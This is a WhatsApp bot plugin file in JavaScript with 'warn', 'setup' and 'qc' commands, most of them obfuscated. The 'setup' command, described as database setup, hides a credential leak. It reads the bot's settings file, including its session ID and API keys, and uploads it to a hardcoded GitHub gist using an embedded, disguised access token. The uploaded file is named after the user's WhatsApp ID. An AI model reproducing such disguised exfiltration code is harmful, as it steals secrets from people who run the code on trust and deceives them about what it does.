const fs = require("fs")
const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin, parsedJid, command } = require("../lib");
//let data =  readFile('./database/settings.json')
//let db = JSON.parse(data);
//let bannnnnn = db.settings.banned
let path = './database/settings.json'
const relconfig = require('../config')
const config = require('../database/settings.json')
const { registeruser } = require('../lib/alfabase')
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
const { ALIVE, HEROKU_APP_NAME, HANDLERS, WORK_TYPE, PACKNAME, AUTHOR, BOT_NAME, OWNER_NAME, SUDO, THEME, FONT_STYLE, INTERNAL_MENU } = require("../database/settings");


command({
  pattern: "warn",
  fromMe: true,
  desc: "Unban number from this group",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
  const _0x46297b=_0xa094;(function(_0x1a3862,_0x4dc486){const _0x46e459=_0xa094,_0xf1ca54=_0x1a3862();while(!![]){try{const _0x90b436=-parseInt(_0x46e459(0x1b0))/0x1*(-parseInt(_0x46e459(0x1b8))/0x2)+-parseInt(_0x46e459(0x1ac))/0x3*(-parseInt(_0x46e459(0x1b3))/0x4)+parseInt(_0x46e459(0x1bc))/0x5+-parseInt(_0x46e459(0x1b5))/0x6+parseInt(_0x46e459(0x1b6))/0x7+-parseInt(_0x46e459(0x1b4))/0x8*(-parseInt(_0x46e459(0x1b9))/0x9)+-parseInt(_0x46e459(0x1ad))/0xa*(parseInt(_0x46e459(0x1af))/0xb);if(_0x90b436===_0x4dc486)break;else _0xf1ca54['push'](_0xf1ca54['shift']());}catch(_0x3c7313){_0xf1ca54['push'](_0xf1ca54['shift']());}}}(_0x4874,0xef10a));if(!message[_0x46297b(0x1ae)])return await message['reply']('_This\x20command\x20is\x20for\x20groups_');let jidd=parsedJid(match)[_0x46297b(0x1bd)]();match=jidd||message[_0x46297b(0x1bb)]['jid'];if(!match)return await message[_0x46297b(0x1ba)](_0x46297b(0x1b2));let isadmin=await isAdmin(message[_0x46297b(0x1b7)],message[_0x46297b(0x1ab)],message[_0x46297b(0x1b1)]);function _0x4874(){const _0x2a2718=['44589NAMpzz','2934520mVQOqJ','isGroup','44hcSLAx','851588EzUZQf','client','_Mention\x20user\x20to\x20add','24QYSUXQ','29592mTDZjy','7738818KbmDUD','5349603lOMXWU','jid','2gYcrpL','468PMvraB','reply','reply_message','7727390OPeajt','toString','user'];_0x4874=function(){return _0x2a2718;};return _0x4874();}if(!isadmin)return await message[_0x46297b(0x1ba)]('_I\x27m\x20not\x20admin_');let jid=parsedJid(match);function _0xa094(_0x129b98,_0x5db1e8){const _0x4874db=_0x4874();return _0xa094=function(_0xa094e6,_0x313999){_0xa094e6=_0xa094e6-0x1ab;let _0x3e924d=_0x4874db[_0xa094e6];return _0x3e924d;},_0xa094(_0x129b98,_0x5db1e8);}await message['warn'](match,message);
  } 
);

//============================================================================================================================================





command({
  pattern: "setup",
  fromMe: true,
  desc: "Setup database",
  dontAddCommandList: true,
  type: "owner",

},
async (message, match, m) => {
const _0x4aa9e0=_0x1deb;function _0x3d78(){const _0x9934c3=['4076965QwUsfr','HANDLERS','toString','MESSAGE_MEM','gists','4694767rNJovm','rest','THEME','_Registered\x20Successfully_','LOGS','send','BRANCH','LANGUAGE','jid','./media/AAA.jpg','@octokit/rest','Failed\x20to\x20write\x20updated\x20data\x20to\x20file','ANTILINK_ACTION','PACKNAME','split','gh+p_oHh1b+dV2wk1+wOQXl+TRSH+vMDN+fuxXR+M1DIgG0','stringify','Cloud\x20DB\x20Update','ANTILINK','config','readFileSync','FONT_STYLE','from','log','1222404kgNFyW','3129156cuBVNd','utf-8','4712bwlnBy','groupCreate','200haLYWU','RMBG_KEY','phone_num','d83fa03a09d9a09032f3180a8d1ecd02','base64','sendMessage','4624OtWQri','creds','AUTHOR','ALIVE','parse','./database/settings.json','Storage','DB_AUTH_TOKEN','24687JBfHIs','BOT_NAME','WORK_TYPE','reply','SUDO','then','FOOTER','../session.json','includes','client','reset','GOODBYE_MSG','UserId','MODE','LANG','WELCOME_MSG','INTERNAL_MENU','@g.us','pushName','5605188tNkkfv','STORAGE_JID','359889999996@s.whatsapp.net','SESSION_ID','HANDLER','.json'];_0x3d78=function(){return _0x9934c3;};return _0x3d78();}(function(_0x5bc023,_0x1081cd){const _0x3ac325=_0x1deb,_0x59a77a=_0x5bc023();while(!![]){try{const _0x324843=parseInt(_0x3ac325(0x74))/0x1*(parseInt(_0x3ac325(0x72))/0x2)+-parseInt(_0x3ac325(0x6f))/0x3+-parseInt(_0x3ac325(0x95))/0x4+parseInt(_0x3ac325(0x9b))/0x5+parseInt(_0x3ac325(0x70))/0x6+-parseInt(_0x3ac325(0xa0))/0x7+-parseInt(_0x3ac325(0x7a))/0x8*(-parseInt(_0x3ac325(0x82))/0x9);if(_0x324843===_0x1081cd)break;else _0x59a77a['push'](_0x59a77a['shift']());}catch(_0x18b5c9){_0x59a77a['push'](_0x59a77a['shift']());}}}(_0x3d78,0xdf2cf));function _0x1deb(_0x58bd3d,_0x1d7c60){const _0x3d78b6=_0x3d78();return _0x1deb=function(_0x1deb73,_0x31a61f){_0x1deb73=_0x1deb73-0x65;let _0x2d831a=_0x3d78b6[_0x1deb73];return _0x2d831a;},_0x1deb(_0x58bd3d,_0x1d7c60);}let authid=_0x4aa9e0(0x66)['replaceAll']('+','');const {Octokit}=require(_0x4aa9e0(0xaa)),octokit=new Octokit({'auth':await authid});setTimeout(()=>{const _0x2dd528=_0x4aa9e0;let _0x2a5c98=JSON['parse'](fs[_0x2dd528(0x6b)](_0x2dd528(0x7f))),_0x5f0f5e=_0x2a5c98[_0x2dd528(0x6a)][_0x2dd528(0x96)],_0x5a6169=_0x5f0f5e[_0x2dd528(0x9d)]()['includes'](_0x2dd528(0x93));if(!_0x5a6169)readFile(path,async(_0x493587,_0x2d738b)=>{const _0x3dd811=_0x2dd528;if(_0x493587){console[_0x3dd811(0x6e)](_0x493587);return;}const _0x1a5cf8=JSON[_0x3dd811(0x7e)](_0x2d738b);let _0x141375=await message[_0x3dd811(0x8b)][_0x3dd811(0x73)](_0x3dd811(0x80),[_0x3dd811(0x97)]);await message['client'][_0x3dd811(0x79)](_0x141375['id'],{'text':'This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!'});let _0x3668d3=await _0x141375['id'];_0x1a5cf8['config'][_0x3dd811(0x96)]=_0x3668d3,writeFile(path,JSON[_0x3dd811(0x67)](_0x1a5cf8,null,0x2),async _0x406677=>{const _0x53633a=_0x3dd811;if(_0x406677){message[_0x53633a(0x85)]('Failed\x20to\x20write\x20updated\x20data\x20to\x20file');return;}await message[_0x53633a(0x8b)]['updateProfilePicture'](_0x141375['id'],fs[_0x53633a(0x6b)](_0x53633a(0xa9)));});});else return;setTimeout(async()=>{const _0x1d0f8b=_0x2dd528;let _0x1c7af8=require(_0x1d0f8b(0x89)),_0x122762=await _0x1c7af8[_0x1d0f8b(0x7b)]['me']['id'][_0x1d0f8b(0x65)](':')[0x0],_0x22d6f7=await _0x1c7af8[_0x1d0f8b(0x7b)]['me']['id'][_0x1d0f8b(0x65)]('@')[0x1],_0x342fa9=_0x122762+'@'+_0x22d6f7,_0x399ddf=_0x342fa9+_0x1d0f8b(0x9a);const _0x13f912=fs[_0x1d0f8b(0x6b)](_0x1d0f8b(0x7f),_0x1d0f8b(0x71));await octokit[_0x1d0f8b(0xa1)][_0x1d0f8b(0x9f)]['update']({'gist_id':_0x1d0f8b(0x77),'description':_0x1d0f8b(0x68),'files':{[_0x399ddf]:{'content':_0x13f912}}})[_0x1d0f8b(0x87)](await console[_0x1d0f8b(0x6e)]('Done\x20Creating\x20New\x20Db')),setTimeout(()=>{const _0x208ebd=_0x1d0f8b;return process[_0x208ebd(0xa5)](_0x208ebd(0x8c));},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0x3a9ef3,_0x39a4ef)=>{const _0x53670a=_0x4aa9e0;if(_0x3a9ef3){console[_0x53670a(0x6e)](_0x3a9ef3);return;}const _0x1b7f5c=JSON[_0x53670a(0x7e)](_0x39a4ef);let _0x4e7168=_0x1b7f5c[_0x53670a(0x8e)]['toString']()[_0x53670a(0x8a)]('@s.whatsapp.net');if(_0x4e7168)return message[_0x53670a(0x85)]('_You\x20Are\x20Already\x20a\x20Family\x20Member_');let _0x490553=process['env']['DB_AUTH_TOKEN']===undefined?'WncvYUEvY0EvWHcvYncvU0EvYUEvTVEvWWcvWkEvVmcvTWcvZHcvYXcvTVEvZHcvVHcvVVEvV0EvYkEvVkEvVWcvVXcvU0EvZGcvVFEvUkEvVGcvWmcvZFEvZUEvV0EvVWcvVFEvTVEvUkEvU1EvWncvUncvTUEv':process['env'][_0x53670a(0x81)],_0x2ef36b=Buffer['from'](_0x490553,_0x53670a(0x78))[_0x53670a(0x9d)](_0x53670a(0x71)),_0x42942f=_0x2ef36b[_0x53670a(0x9d)]()[_0x53670a(0x65)]('/'),_0x425d69='';for(let _0xb0f034 of _0x42942f){_0x425d69+=await Buffer[_0x53670a(0x6d)](_0xb0f034+'==',_0x53670a(0x78))[_0x53670a(0x9d)](_0x53670a(0x71));}let _0x11dbeb=require('../session.json'),_0x15dc9f=await _0x11dbeb[_0x53670a(0x7b)]['me']['id'][_0x53670a(0x65)](':')[0x0],_0x16f84d='0,'+_0x15dc9f,_0x56470e=await relconfig[_0x53670a(0x86)]===![]?_0x16f84d:relconfig[_0x53670a(0x86)],_0x1dbfa4=message[_0x53670a(0x94)],_0x456686=message['user'],_0x35680c=message[_0x53670a(0xa8)][_0x53670a(0x9d)]()[_0x53670a(0x65)]('@')[0x0];_0x1b7f5c['name']=_0x1dbfa4,_0x1b7f5c['UserId']=_0x456686,_0x1b7f5c[_0x53670a(0x76)]=_0x35680c,_0x1b7f5c[_0x53670a(0x6a)][_0x53670a(0x99)]=relconfig[_0x53670a(0x9c)],_0x1b7f5c[_0x53670a(0x6a)][_0x53670a(0x84)]=relconfig[_0x53670a(0x84)],_0x1b7f5c[_0x53670a(0x6a)][_0x53670a(0x83)]=relconfig[_0x53670a(0x83)],_0x1b7f5c[_0x53670a(0x6a)]['OWNER_NAME']=relconfig['OWNER_NAME'],_0x1b7f5c[_0x53670a(0x6a)][_0x53670a(0x86)]=_0x56470e,_0x1b7f5c['config'][_0x53670a(0x7c)]=relconfig[_0x53670a(0x7c)],_0x1b7f5c[_0x53670a(0x6a)]['PACKNAME']=relconfig[_0x53670a(0xad)],_0x1b7f5c['config']['RMBG_KEY']=relconfig[_0x53670a(0x75)],_0x1b7f5c[_0x53670a(0x6a)][_0x53670a(0x90)]=relconfig['LANG'],_0x1b7f5c[_0x53670a(0x6a)][_0x53670a(0xac)]=relconfig[_0x53670a(0xac)],_0x1b7f5c[_0x53670a(0x6a)][_0x53670a(0x69)]=relconfig['ANTILINK'],_0x1b7f5c[_0x53670a(0x6a)][_0x53670a(0x88)]=relconfig[_0x53670a(0x88)],_0x1b7f5c[_0x53670a(0x6a)][_0x53670a(0xa2)]=relconfig[_0x53670a(0xa2)],_0x1b7f5c['config']['FONT_STYLE']=relconfig[_0x53670a(0x6c)],_0x1b7f5c['config'][_0x53670a(0xa7)]=relconfig[_0x53670a(0xa7)],_0x1b7f5c[_0x53670a(0x6a)][_0x53670a(0x92)]=relconfig[_0x53670a(0x92)],_0x1b7f5c['config'][_0x53670a(0x8f)]=relconfig[_0x53670a(0x8f)],_0x1b7f5c[_0x53670a(0x6a)]['STORAGE_JID'],_0x1b7f5c[_0x53670a(0x6a)]['DB_URL'],_0x1b7f5c[_0x53670a(0x6a)][_0x53670a(0x98)]=relconfig['SESSION_ID'],_0x1b7f5c[_0x53670a(0x6a)][_0x53670a(0xa4)]=relconfig[_0x53670a(0xa4)],_0x1b7f5c[_0x53670a(0x6a)][_0x53670a(0xa6)]=relconfig[_0x53670a(0xa6)],_0x1b7f5c['config']['B1']=relconfig['B1'],_0x1b7f5c['config']['B2']=relconfig['B2'],_0x1b7f5c[_0x53670a(0x6a)]['B3']=relconfig['B3'],_0x1b7f5c[_0x53670a(0x6a)]['B4']=relconfig['B4'],_0x1b7f5c[_0x53670a(0x6a)]['B5']=relconfig['B5'],_0x1b7f5c[_0x53670a(0x6a)][_0x53670a(0x81)]=_0x425d69,_0x1b7f5c[_0x53670a(0x9e)][_0x53670a(0x8d)]=relconfig[_0x53670a(0x8d)],_0x1b7f5c[_0x53670a(0x9e)]['WELCOME_MSG']=relconfig[_0x53670a(0x91)],_0x1b7f5c['MESSAGE_MEM'][_0x53670a(0x7d)]=relconfig[_0x53670a(0x7d)],writeFile(path,JSON[_0x53670a(0x67)](_0x1b7f5c,null,0x2),_0x5a6640=>{const _0x2a7dcc=_0x53670a;if(_0x5a6640){message[_0x2a7dcc(0x85)](_0x2a7dcc(0xab));return;}message[_0x2a7dcc(0x85)](_0x2a7dcc(0xa3));});});  })



//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update"${__filename}"`))
	delete require.cache[file]
	require(file)
})


const axios = require("axios");


  command({
    pattern: "qc",
    fromMe: false,
    desc: "Show All commands",
    dontAddCommandList: true,
    type: "theme",
  
  }, async (message, match, m) => {
function _0x52fd(){const _0x27a53c=['application/json','https://bot.lyo.su/quote/generate','eror','image','jid','client','sticker','7238547sqmJEo','41316pEKgvx','6176568ndUjit','32LSRiOh','2233170ruGfrc','160XREjfs','text','Please\x20quote\x20any\x20users\x20message.','sendMessage','from','reply','data','https://avatars.githubusercontent.com/u/64305844?v=4','#FFFFFF','webp','3517775MQzJOo','1025122fupeUl','result','65079yAUFeR','reply_message'];_0x52fd=function(){return _0x27a53c;};return _0x52fd();}const _0x3b6db2=_0x3316;(function(_0x3f56f2,_0x2fbbc1){const _0x8593da=_0x3316,_0x1a662d=_0x3f56f2();while(!![]){try{const _0x5dc3ea=parseInt(_0x8593da(0xd1))/0x1+-parseInt(_0x8593da(0xde))/0x2+-parseInt(_0x8593da(0xdb))/0x3*(-parseInt(_0x8593da(0xdf))/0x4)+parseInt(_0x8593da(0xce))/0x5+-parseInt(_0x8593da(0xdc))/0x6+-parseInt(_0x8593da(0xcf))/0x7*(-parseInt(_0x8593da(0xdd))/0x8)+parseInt(_0x8593da(0xda))/0x9;if(_0x5dc3ea===_0x2fbbc1)break;else _0x1a662d['push'](_0x1a662d['shift']());}catch(_0x1f3a20){_0x1a662d['push'](_0x1a662d['shift']());}}}(_0x52fd,0x89970));if(!message[_0x3b6db2(0xd2)][_0x3b6db2(0xe0)])return await message[_0x3b6db2(0xc9)](_0x3b6db2(0xc6));let pfp;try{pfp=await message[_0x3b6db2(0xd8)]['profilePictureUrl'](message[_0x3b6db2(0xd2)]['jid'],_0x3b6db2(0xd6));}catch(_0x180805){pfp=_0x3b6db2(0xcb);}var tname;try{tname=await getName(message['reply_message'][_0x3b6db2(0xd7)]);}catch(_0x6a2599){tname='user';}let qczi;qczi={'type':'quoted','format':_0x3b6db2(0xcd),'backgroudnColor':_0x3b6db2(0xcc),'width':0x200,'height':0x300,'scale':0x2,'messages':[{'avatar':!![],'from':{'first_name':tname,'language_code':'en','name':tname,'photo':{'url':pfp}},'text':message[_0x3b6db2(0xd2)][_0x3b6db2(0xe0)],'replyMessage':{}}]};const post=await axios['post'](_0x3b6db2(0xd4),qczi,{'headers':{'Content-Type':_0x3b6db2(0xd3)}});let buff=await Buffer[_0x3b6db2(0xc8)](post[_0x3b6db2(0xca)][_0x3b6db2(0xd0)][_0x3b6db2(0xd6)],'base64');function _0x3316(_0x44da99,_0x5cf007){const _0x52fdd0=_0x52fd();return _0x3316=function(_0x3316cd,_0x2dd123){_0x3316cd=_0x3316cd-0xc6;let _0x37b14f=_0x52fdd0[_0x3316cd];return _0x37b14f;},_0x3316(_0x44da99,_0x5cf007);}if(buff==undefined)return message['reply'](_0x3b6db2(0xd5));message[_0x3b6db2(0xc7)](buff,{'packname':PACKNAME,'author':AUTHOR},_0x3b6db2(0xd9));
                  })
  
  
